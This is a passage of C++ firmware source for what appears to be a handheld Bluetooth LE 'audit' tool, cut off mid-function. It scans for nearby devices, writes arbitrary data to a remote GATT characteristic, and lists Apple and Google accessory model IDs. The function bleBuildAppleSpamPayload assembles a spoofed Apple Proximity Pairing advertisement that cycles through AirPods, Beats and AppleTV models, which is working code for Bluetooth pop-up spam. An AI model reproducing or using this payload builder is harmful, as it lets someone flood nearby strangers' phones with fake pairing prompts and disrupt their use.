#include "ble_manager.h"
#include "BLEDevice.h"
#include "BLEScan.h"
#include "BLEClient.h"
#include "BLEConnect.h"
#include "../../debug.h"
#include "../config/app_config.h"
#include "../core/led_controller.h"
#include "../oled/oled_display.h"
#include "../security/security_utils.h"
#include <string.h>

#ifdef __cplusplus
extern "C" {
#endif
#include "gap_le_types.h"
#include "gap_callback_le.h"
#ifdef __cplusplus
}
#endif

std::vector<BLEAuditResult> g_ble_results;
static volatile bool g_ble_scan_accepting = false;

static const uint8_t kAppleModels[][2] = {
    {0x02, 0x20}, // AirPods
    {0x0E, 0x20}, // AirPods Pro
    {0x0A, 0x20}, // AirPods Max
    {0x0F, 0x20}, // AirPods 2nd Gen
    {0x13, 0x20}, // AirPods 3rd Gen
    {0x14, 0x20}, // AirPods Pro 2nd Gen
    {0x03, 0x20}, // PowerBeats3
    {0x0B, 0x20}, // PowerBeats Pro
    {0x0C, 0x20}, // Beats Solo Pro
    {0x11, 0x20}, // Beats Studio Buds
    {0x10, 0x20}, // Beats Flex
    {0x05, 0x20}, // AppleTV Setup
    {0x06, 0x20}, // HomePod Setup
    {0x09, 0x20}, // AppleTV Connect
};

static const uint32_t kGoogleModels[] = {
    0x0002F0, 0x000006, 0x00000A, 0x000055, 0x000070,
    0x000007, 0x000012, 0x0000F0, 0x000001, 0x000003
};

static void _bleScanCallback(T_LE_CB_DATA* p_data) {
    if (!g_ble_scan_accepting || p_data == nullptr || p_data->p_le_scan_info == nullptr) {
        return;
    }
    if (g_ble_results.size() >= MAX_BLE_RESULTS) {
        return;
    }

    T_LE_SCAN_INFO* info = p_data->p_le_scan_info;
    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             info->bd_addr[5], info->bd_addr[4], info->bd_addr[3],
             info->bd_addr[2], info->bd_addr[1], info->bd_addr[0]);

    for (size_t i = 0; i < g_ble_results.size(); i++) {
        if (strcmp(g_ble_results[i].address, mac_str) == 0) {
            return;
        }
    }

    BLEAuditResult res;
    memcpy(res.address, mac_str, sizeof(res.address));
    res.addr_type = (uint8_t)info->remote_addr_type;
    res.rssi = (int16_t)info->rssi;
    res.name = parseBleDeviceName(info->data, info->data_len);
    g_ble_results.push_back(res);
}

void bleManagerInit() {
    g_ble_results.reserve(MAX_BLE_RESULTS);
}

size_t bleScanDevices() {
    g_ble_results.clear();
    g_ble_scan_accepting = true;

    BLE.end();
    BLE.init();
    BLE.beginCentral(1);
    BLE.setScanCallback(_bleScanCallback);

    BLEScan* pScan = BLE.configScan();
    if (pScan != nullptr) {
        // BLEScan::startScan(ms) blocks for ms and calls stopScan() internally
        pScan->startScan(BLE_SCAN_DURATION_MS);
    }

    g_ble_scan_accepting = false;
    BLE.setScanCallback(nullptr);
    BLE.end();
    return g_ble_results.size();
}

BleWriteStatus bleWriteCharacteristic(const String& mac, uint8_t addr_type,
                                      const String& service_uuid,
                                      const String& char_uuid,
                                      const uint8_t* payload, size_t payload_len) {
    if (!payload || payload_len == 0) return BleWriteStatus::BLE_WRITE_FAILED;

    T_GAP_REMOTE_ADDR_TYPE gap_addr_type = (addr_type == GAP_REMOTE_ADDR_LE_RANDOM)
                                           ? GAP_REMOTE_ADDR_LE_RANDOM
                                           : GAP_REMOTE_ADDR_LE_PUBLIC;

    BLE.end();
    BLE.init();
    BLE.beginCentral(1);

    BleWriteStatus status = BleWriteStatus::BLE_WRITE_CONNECT_FAILED;
    BLEConnect* pConn = BLE.configConnection();
    int8_t conn_id = -1;

    if (pConn != nullptr && pConn->connect((char*)mac.c_str(), gap_addr_type, BLE_CONNECT_WAIT_MS)) {
        const unsigned long conn_start = millis();
        while ((unsigned long)(millis() - conn_start) < BLE_CONNECT_WAIT_MS) {
            conn_id = pConn->getConnId((char*)mac.c_str(), (uint8_t)gap_addr_type);
            if (conn_id >= 0 && BLE.connected((uint8_t)conn_id)) {
                break;
            }
            delay(50);
        }

        if (conn_id >= 0 && BLE.connected((uint8_t)conn_id)) {
            BLE.configClient();
            BLEClient* pClient = BLE.addClient((uint8_t)conn_id);
            if (pClient == nullptr) {
                status = BleWriteStatus::BLE_WRITE_CLIENT_FAILED;
            } else {
                pClient->discoverServices();
                const unsigned long disc_start = millis();
                while (!pClient->discoveryDone() &&
                       pClient->connected() &&
                       (unsigned long)(millis() - disc_start) < BLE_DISCOVERY_TIMEOUT_MS) {
                    delay(50);
                }

                if (!pClient->discoveryDone()) {
                    status = BleWriteStatus::BLE_WRITE_DISCOVERY_TIMEOUT;
                } else {
                    BLERemoteService* pService = pClient->getService(service_uuid.c_str());
                    if (pService == nullptr) {
                        status = BleWriteStatus::BLE_WRITE_SERVICE_NOT_FOUND;
                    } else {
                        BLERemoteCharacteristic* pChar = pService->getCharacteristic(char_uuid.c_str());
                        if (pChar == nullptr) {
                            status = BleWriteStatus::BLE_WRITE_CHAR_NOT_FOUND;
                        } else if (pChar->setData((uint8_t*)payload, (uint16_t)payload_len)) {
                            status = BleWriteStatus::BLE_WRITE_OK;
                        } else {
                            status = BleWriteStatus::BLE_WRITE_FAILED;
                        }
                    }
                }
            }
            pConn->disconnect((uint8_t)conn_id);
            delay(50);
        }
    }

    BLE.end();
    return status;
}

size_t bleBuildAppleSpamPayload(uint8_t* out_buf, size_t cap, int rotation, uint8_t r0, uint8_t r1) {
    if (!out_buf || cap < BLE_APPLE_PAYLOAD_LEN) return 0;
    const int count = (int)(sizeof(kAppleModels) / sizeof(kAppleModels[0]));
    const int idx = (rotation < 0 ? 0 : rotation) % count;

    // Exact 30-byte Apple Proximity Pairing packet:
    // AD1: len=2, type=0x01, flags=0x1A (3 bytes)
    // AD2: len=0x1A (26 bytes), type=0xFF, data=25 bytes (27 bytes total) => 3 + 27 = 30 bytes
    const uint8_t apple[BLE_APPLE_PAYLOAD_LEN] = {
        0x02, 0x01, 0x1A,
        0x1A, 0xFF, 0x4C, 0x00,
        0x07, 0x19, 0x07,
        kAppleModels[idx][0], kAppleModels[idx][1],
        0xC0,
        r0, r1,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    memcpy(out_buf, apple, sizeof(apple));
    return sizeof(apple);
